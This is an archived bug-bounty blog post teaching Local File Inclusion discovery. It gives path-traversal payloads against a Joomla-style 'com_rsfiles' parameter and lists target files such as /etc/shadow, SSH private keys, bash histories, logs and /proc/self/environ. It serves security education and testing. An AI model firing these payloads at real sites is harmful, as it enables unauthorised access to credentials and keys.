# A Guide to LFI Discovery

- **Source URL:** https://medium.com/@facu.tha/a-guide-to-lfi-discovery-uncover-vulnerabilities-and-enhance-web-security-bug-bounty-4567f27eebbf?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240105162038/https://medium.com/@facu.tha/a-guide-to-lfi-discovery-uncover-vulnerabilities-and-enhance-web-security-bug-bounty-4567f27eebbf
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/4246 (id 4246)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# A Guide to LFI Discovery: Uncover Vulnerabilities and Enhance Web Security | Bug bounty

--

Hi guys,

**Local File Inclusion (LFI)** is a type of web vulnerability that can have significant impacts on web security. LFI occurs when a web application allows an attacker to include files on the server through the web browser.

Examples:

`www.target.com/?option=com_rsfiles&task=files.display&path=/////etc/passwd``www.target.com/search=/../../../../etc/passwd``www.target.com/search=//..//..//..//..//etc/passwd`
The attacker can manipulate the input **to load arbitrary files**, including sensitive system files, configuration files, or even executable scripts. LFI vulnerabilities are particularly concerning because *they can lead to data exposure, unauthorized access to sensitive files, and even remote code execution.*

The impact of LFI on web security can be huge. When exploited, LFI vulnerabilities can allow attackers to:

1. **Access Sensitive Information:** Attackers can access system files, application source code, and configuration files, which may contain critical information like passwords, API keys, or user data.
2. **Execute Arbitrary Code:** In some cases, LFI can lead to remote code execution, giving attackers the ability to run malicious code on the server, potentially compromising the entire system.
3. **Bypass Security Controls:** LFI can bypass security mechanisms and access restricted directories, circumventing authentication and authorization checks.
4. **Data Exposure:** User data, logs, and other confidential information can be exposed, leading to privacy violations and compliance issues.
5. **System Compromise:** If an attacker can upload and execute files, LFI can be a stepping stone to a full system compromise, putting the web application, server, and data at risk.

To mitigate LFI vulnerabilities, *web developers should carefully validate and sanitize user input and avoid using user-controlled data when specifying file paths*. Regular security testing and code reviews are essential to identify and address LFI vulnerabilities before they can be exploited by malicious actors.

# HAPPYHACKING:

As always, I started off doing some reconnaissance, to better show my methodology these are the commands I used:

#1

#2

#3

After the brief recon, and testing my domains using httpx, I found a parameter that looked interesting.

`?option=com_rsfiles&task=files.display&path=`
I attempted a basic LFI payload:

`/////////////../../../../etc/group``/////////////////////////////////////////////../etc/passwd`
**ProTip: When looking for these types of vulns, try to retrieve sensitive files, below ⬇️ you can find paths of important files.**

## SENSITIVE FILES

```
/etc/issue (A message or system identification to be printed before the login prompt.)
/etc/motd (Message of the day banner content. Can contain information about the system owners or use of the system.)
/etc/passwd 
/etc/group 
/etc/resolv.conf (might be better than /etc/passwd for triggering IDS sigs)
/etc/shadow
/home/[USERNAME]/.bash_history or .profile
~/.bash_history or .profile
$USER/.bash_history or .profile
/root/.bash_history or .profile
```
## **WEB SERVERS**

```
# Usually found in the root of the website /root/
.htaccess
config.php
```
## SHH

```
authorized_keys
id_rsa
id_rsa.keystore
id_rsa.pub
known_hosts
```
## **LOGS**

```
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log
```
## PROC FILES

“Under Linux, /proc includes a directory for each running process, including kernel processes, in directories named /proc/PID, where PID is the process number. Each directory contains information about one process, including: /proc/PID/cmdline, the command that originally started the process.” [Wiki](https://en.wikipedia.org/wiki/Procfs)


```
/proc/sched_debug # Can be used to see what processes the machine is running
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/version
/proc/self/environ
```
I will keep digging and see what else I can find on this Web Application. Thanks for reading. Let’s connect on LinkedIn >> [www.linkedin.com/in/facufernandez](http://www.linkedin.com/in/facufernandez)
